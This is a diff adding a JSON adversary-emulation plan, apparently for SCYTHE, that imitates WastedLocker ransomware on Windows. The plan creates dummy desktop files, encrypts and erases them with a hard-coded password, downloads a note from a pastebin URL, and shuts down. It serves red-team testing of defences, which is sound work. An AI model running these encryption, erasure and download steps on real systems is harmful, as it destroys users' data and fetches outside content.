@@ -1,0 +1,88 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "WastedLocker is the ransomware that was used by EvilCorp in the July 2020 attack against Garmin.",
+        "display_name": "WastedLocker",
+        "name": "WastedLocker",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "crypt",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\EvilCorp\"",
+                "rtags": [
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\EvilCorp\\important_files.wasted\" --size 5MB --count 50",
+                "rtags": [
+                    "att&ck-technique:T1078"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target \"%USERPROFILE%\\Desktop\\EvilCorp\\\" --encrypt --password \"3v1lC0rP\" --erase --recurse",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://pastebin.com/ZyVJEYB4\" --dest \"%USERPROFILE%\\Desktop\\EvilCorp\\wasted_info.txt\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
